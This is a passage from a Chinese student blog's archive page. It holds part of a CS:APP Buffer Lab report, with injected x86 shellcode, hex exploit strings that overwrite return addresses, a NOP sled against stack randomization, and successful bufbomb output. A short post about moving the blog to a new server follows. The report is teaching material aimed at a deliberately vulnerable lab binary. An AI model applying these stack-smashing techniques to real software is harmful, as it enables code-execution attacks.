<p>最后我们根据以上的信息来生成我们最终的攻击代码，如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 4c 92 de 3d a3 00 d1</div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">9d 8c 04 08　           /* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段2完成。</p>
<h3 id="阶段3：炸药（Dynamite）"><a href="#阶段3：炸药（Dynamite）" class="headerlink" title="阶段3：炸药（Dynamite）"></a>阶段3：炸药（Dynamite）</h3><p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：</p>
<ol>
<li>在栈上执行机器代码</li>
<li>将返回指针置于代码的起始</li>
<li>修复对栈造成的破坏</li>
</ol>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路如下：</p>
<ol>
<li>缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码</li>
<li>攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）</li>
<li>然后再将返回值（%eax）设置为cookie</li>
<li>最终修改栈顶（%esp）并ret</li>
</ol>
<p>缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：</p>
<ol>
<li>跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。</li>
<li>程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret</li>
<li>程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行</li>
</ol>
<p>下面我们讨论一下攻击代码中具体的细节。</p>
<p>首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。<br>栈上的返回地址和阶段2一样，为0x55682f58。</p>
<p>然后我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x8048dbe, %eax <span class="comment">;将真正的返回地址送入%eax</span></div><div class="line"><span class="keyword">mov</span> %eax, -<span class="number">0x2c</span>(%ebp) <span class="comment">;将%eax送入栈上的正确位置</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;修改返回值</span></div><div class="line"><span class="keyword">sub</span> <span class="number">$4</span>, %esp <span class="comment">;修改栈顶%esp</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">08048<span class="keyword">daa</span> &lt;<span class="keyword">test</span>&gt;:</div><div class="line"> 8048<span class="keyword">daa</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048dab:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048dad:       <span class="number">53</span>                      <span class="keyword">push</span>   %ebx</div><div class="line"> 8048dae:       <span class="number">83</span> ec <span class="number">24</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048db1:       e8 da ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048db6:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    %eax,-<span class="number">0xc</span>(%ebp)</div><div class="line"> 8048db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   80491f4 &lt;getbuf&gt;</div><div class="line"> 8048dbe:       <span class="number">89</span> c3                   <span class="keyword">mov</span>    %eax,%ebx</div><div class="line"> 8048dc0:       e8 cb ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048dc5:       8b <span class="number">55</span> f4                <span class="keyword">mov</span>    -<span class="number">0xc</span>(%ebp),%edx</div><div class="line"> 8048dc8:       <span class="number">39</span> d0                   <span class="keyword">cmp</span>    %edx,%eax</div><div class="line"> 8048dca:       <span class="number">74</span> 0e                   <span class="keyword">je</span>     8048dda &lt;<span class="keyword">test</span>+<span class="number">0x30</span>&gt;</div><div class="line"> 8048dcc:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">88</span> a3 <span class="number">04</span> <span class="number">08</span>    movl   <span class="number">$0</span>x804a388,(%esp)</div><div class="line"> 8048dd3:       e8 e8 fa ff ff          <span class="keyword">call</span>   80488c0 &lt;puts@plt&gt;</div><div class="line"> 8048dd8:       eb <span class="number">46</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048dda:       3b <span class="number">1d</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%ebx</div><div class="line"> 8048de0:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048e08 &lt;<span class="keyword">test</span>+<span class="number">0x5e</span>&gt;</div><div class="line"> 8048de2:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048de6:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> 2a a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a52a,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048ded:       <span class="number">08</span></div><div class="line"> 8048dee:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048df5:       e8 c6 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048dfa:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x3,(%esp)</div><div class="line"> 8048e01:       e8 <span class="number">75</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048e06:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048e08:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048e0c:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">47</span> a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a547,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048e13:       <span class="number">08</span></div><div class="line"> 8048e14:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048e1b:       e8 a0 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048e20:       <span class="number">83</span> c4 <span class="number">24</span>                <span class="keyword">add</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048e23:       5b                      <span class="keyword">pop</span>    %ebx</div><div class="line"> 8048e24:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %ebp</div><div class="line"> 8048e25:       c3                      <span class="keyword">ret</span>    </div></pre></td></tr></table></figure></p>
<p>我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。</p>
<p>而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。</p>
<p>下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */</div><div class="line">b8 be 8d 04 08 89 45 d4 /* 攻击代码 */</div><div class="line">b8 4c 92 de 3d 83 ec 04</div><div class="line">c3</div></pre></td></tr></table></figure></p>
<p>最后我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段3完成。</p>
<h4 id="攻击代码的优化"><a href="#攻击代码的优化" class="headerlink" title="攻击代码的优化"></a>攻击代码的优化</h4><p>注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。</p>
<p>其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c,%eax <span class="comment">;返回值</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x55682f80,%ebp <span class="comment">;修改%ebp</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048dbe <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>根据以上的信息重新生成我们的攻击代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/</div><div class="line">b8 4c 92 de 3d bd 80 2f /* 攻击代码 */</div><div class="line">68 55 68 be 8d 04 08 c3</div></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h3 id="阶段4：硝化甘油（Nitroglycerin）"><a href="#阶段4：硝化甘油（Nitroglycerin）" class="headerlink" title="阶段4：硝化甘油（Nitroglycerin）"></a>阶段4：硝化甘油（Nitroglycerin）</h3><blockquote>
<p>需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段</p>
</blockquote>
<p>本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。</p>
<p>具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。</p>
<p>若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。</p>
<p>在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。</p>
<p>首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。</p>
<p>我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。</p>
<p>具体的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span> <span class="number">0x28</span>(%esp), %ebp <span class="comment">;复原%ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;设置cookie</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048e3a <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。</p>
<p>最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。</p>
<p>最终我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24</div><div class="line">28 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */</div></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段4完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。</p>
<p>除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/05/16/深入理解计算机系统BufferLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/05/12/迁移说明/">
                            迁移说明
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-05-12T17:36:25+08:00">
	
		    5月 12, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/通知/">通知</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h2 id="博客历史"><a href="#博客历史" class="headerlink" title="博客历史"></a>博客历史</h2><ul>
<li>本博客自2016年1月4日上线。最早部署于BlackDragon的阿里云上，使用的是WordPress框架，服务器则采用了LAMP环境，DNS解析至一级域名。</li>
<li>博客自上线后曾频繁的出现无法连接至数据库的情况，经过检查可能的原因是Apache占用的内存过大以至于MySQL服务被杀。后采用LNMP环境。</li>
<li>2016年12月12日，将博客整个导出至Hexo并且部署至Github Pages，DNS解析至二级域名blog，原服务器与域名停止解析。</li>
</ul>
<h2 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h2><blockquote>
<p>博客迁移的原因<br>在目前，我仍然希望这个博客的内容能被更多的人关注到，也希望能和更多的人交流，所以向Google和Baidu分别提交了Sitemap。<br>但是因国内Baidu仍然作为主要的搜索引擎，加上Github屏蔽了Baidu的爬虫，无法让博客的Sitemap被Baidu抓取并索引，在进行了尝试后决定将博客迁移。</p>
</blockquote>
<p>在遇到上述问题时，我首先尝试了将hexo生成的博客部署到Github以及Coding两个代码仓库，并通过DNS解析将国内和国外的访问分别解析至Coding和Github，并解决了问题。</p>
<p>但是个人觉得这样做不够优雅，经过考虑还是决定将博客重新迁移至自己的阿里云，使用CentOS7作为Server，Nginx作为Web Server，同时将Github的Repo作为Mirror。</p>
<p>博客于2017年5月11日完成迁移，又于2017年5月12日完成相应的优化调整。</p>
<p>现在你可以访问</p>
<ul>
<li><a href="http://blog.duskdragon.com" target="_blank" rel="external">blog.duskdragon.com</a> 主站点</li>
<li><a href="https://blackdragonf.github.io/" target="_blank" rel="external">blackdragonf.github.io</a> 备份站点</li>
</ul>
<blockquote>
<p>这个博客的意义<br>这个博客不是技术博客（目前），因为我现在并没有足够的技能去支持一个技术博客。我现在仅仅是作为一个学习者记录在学习过程中遇到的各种问题，并且将学到的知识加以总结。欢迎任何的技术交流以及错误指正。<br>如果我所记录的题目的解答或是实验的报告能够给同样还在学习的你带来帮助，这就是对我最大的鼓励。</p>
</blockquote>
<h3 id="迁移过程中遇到的问题"><a href="#迁移过程中遇到的问题" class="headerlink" title="迁移过程中遇到的问题"></a>迁移过程中遇到的问题</h3><ul>
<li>在配置iptables时，我在没有开放22端口的情况下将INPUT的默认策略设置为DROP，直接导致了ssh断开连接，不得不重置了阿里云。</li>
<li>/home下的用户文件夹默认不具有读和执行权限，而我的html根目录放在家目录下，这导致了我在部署nginx时出现了403 Forbidden的错误。</li>
</ul>
<h2 id="优化调整"><a href="#优化调整" class="headerlink" title="优化调整"></a>优化调整</h2><p>本次迁移博客同时对于博客做出了以下优化及调整：</p>
<ul>
<li>将背景图片从PNG格式改为JPG格式，减少网页加载的时间</li>
<li>之前为了美观采用了WQY字体，但是将字体作为资源文件大大延长了加载的时间，现在博客的中文字体采用了Google Fonts中的Noto Sans SC</li>
</ul>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/05/12/迁移说明/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
          <li class="pagination-next">
            <a class="btn btn--default btn--small" href="/archives/page/2/">
              <span>下一页</span>
              <i class="fa fa-angle-right text-base icon-ml"></i>
            </a>
          </li>
        
        <li class="pagination-number">第 1 页 共 3 页</li>
    </ul>
</div>

</section>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2017 CoSidian. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
            <h4 id="about-card-name">CoSidian</h4>
        
            <div id="about-card-bio"><p>码龙黑曜 - iOS开发者/计算机科学/兽人控</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>本科在读</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                HUST, Wuhan, China
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-6vdiix6siapvwghon7lidx0gknpzcytesubc5zbclfpo3imycvj35gg9xww8.min.js"></script>
<!--SCRIPTS END-->



    </body>
</html>
